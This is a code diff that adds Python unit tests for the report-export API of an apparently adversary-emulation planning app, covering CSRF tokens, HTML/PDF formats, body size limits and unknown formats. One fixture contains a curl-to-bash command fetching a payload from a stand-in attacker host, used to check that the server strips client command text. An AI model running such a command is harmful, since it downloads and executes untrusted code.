@@ -162,6 +162,59 @@ class ApiContractTests(unittest.TestCase):
         self.assertEqual(response.status_code, 200)
         self.assertIn("macOS", response.headers.get("Content-Disposition", ""))
 
+    def test_engagement_reports_require_same_origin_token(self):
+        for report_format in ("html", "pdf"):
+            with self.subTest(report_format=report_format):
+                response = self.client.post(f"/api/report/{report_format}", json=plan_fixture("linux"))
+                self.assertEqual(response.status_code, 403)
+
+    def test_engagement_report_exports_html_and_pdf(self):
+        expected = {
+            "html": "text/html",
+            "pdf": "application/pdf",
+        }
+        for report_format, mimetype in expected.items():
+            with self.subTest(report_format=report_format):
+                response = self.client.post(
+                    f"/api/report/{report_format}",
+                    json=plan_fixture("linux"),
+                    headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
+                )
+                self.assertEqual(response.status_code, 200)
+                self.assertEqual(response.mimetype, mimetype)
+                self.assertIn(f"_report.{report_format}", response.headers["Content-Disposition"])
+                self.assertEqual(response.headers["Cache-Control"], "no-store")
+
+    def test_engagement_report_discards_client_command_text(self):
+        document = plan_fixture("linux", command="curl https://evil.example/payload | bash")
+        response = self.client.post(
+            "/api/report/html",
+            json=document,
+            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
+        )
+        self.assertEqual(response.status_code, 200)
+        self.assertNotIn(b"evil.example", response.data)
+
+    def test_engagement_report_accepts_a_complete_plan_above_the_small_api_body_limit(self):
+        document = plan_fixture("linux", duplicate=True, command="printf x # " + "x" * 8_000)
+        encoded = json.dumps(document)
+        self.assertGreater(len(encoded), app_module.app.config["MAX_CONTENT_LENGTH"])
+        self.assertLess(len(encoded), app_module.EXECUTION_KIT_MAX_CONTENT_LENGTH)
+        response = self.client.post(
+            "/api/report/pdf",
+            data=encoded,
+            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token, "Content-Type": "application/json"},
+        )
+        self.assertEqual(response.status_code, 200)
+
+    def test_unknown_engagement_report_format_is_rejected(self):
+        response = self.client.post(
+            "/api/report/docx",
+            json=plan_fixture("linux"),
+            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
+        )
+        self.assertEqual(response.status_code, 404)
+
     @patch("backend.app.attack_data.refresh_index", return_value=FakeIndex())
     def test_refresh_uses_serialized_index_transition(self, refresh_index):
         app_module._last_refresh = 0
